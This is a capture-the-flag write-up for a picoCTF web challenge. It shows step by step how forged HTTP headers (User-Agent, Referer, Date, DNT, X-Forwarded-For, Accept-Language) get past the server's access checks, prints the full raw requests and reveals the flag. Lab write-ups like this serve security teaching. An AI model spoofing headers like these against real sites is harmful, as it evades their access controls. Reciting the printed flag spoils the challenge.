## Description

Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:46199/

## Tools I used
- BurpSuite — used for sending requests (`curl` is good enough but I'm lazy and I like good formatting)
- Chrome developer tools — to get the original request

## Thought Process

Upon logging in, I was greeted with
`Only people who use the official PicoBrowser are allowed on this site!`
which immediately reminded me of the `User-Agent` header for the HTTP request.
\
\
Original request:
```
GET / HTTP/1.1
Host: mercury.picoctf.net:46199
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6
```

\
Modify `User-Agent` to be:
<code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 <mark>PicoBrowser</mark></code>

\
Now we sent the request and received a different response saying
`I don't trust users visiting from another site.`
At this point, I was pretty sure this was just a chain of modifying different headers using the hints until we find the flag.

\
We can add a `Referer` header set to this site:
<code><mark>Referer: http://mercury.picoctf.net:46199</mark></code>

\
Response: `Sorry, this site only worked in 2018.`
Header modification — add a random date that is in 2018:
<code><mark>Date: Wed, 21 Oct 2018 07:28:00 GMT</mark></code>

\
Response: `I don't trust users who can be tracked.`
Header modification — add a `Do Not Track` header set to not tracking:
<code><mark>DNT: 1</mark></code>

\
Response: `This website is only for people from Sweden.`
Header modification — Google up an IP from Sweden:
<code><mark>X-Forwarded-For: 23.92.112.0</mark></code>

\
Response: `You're in Sweden but you don't speak Swedish?`
Header modification — Add Swedish ISO code to the `Accept-Language` header:
<code>Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6<mark>,sv</mark></code>

\
Response: `What can I say except, you are welcome`
And we have our flag on the screen `picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_8d5d8d77}`

\
Final request that got the flag:
```
GET / HTTP/1.1
Host: mercury.picoctf.net:46199
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 PicoBrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6,sv
Referer: http://mercury.picoctf.net:46199
Date: Wed, 21 Oct 2018 07:28:00 GMT
DNT: 1
X-Forwarded-For: 23.92.112.0
```


## Flag
`picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_8d5d8d77}`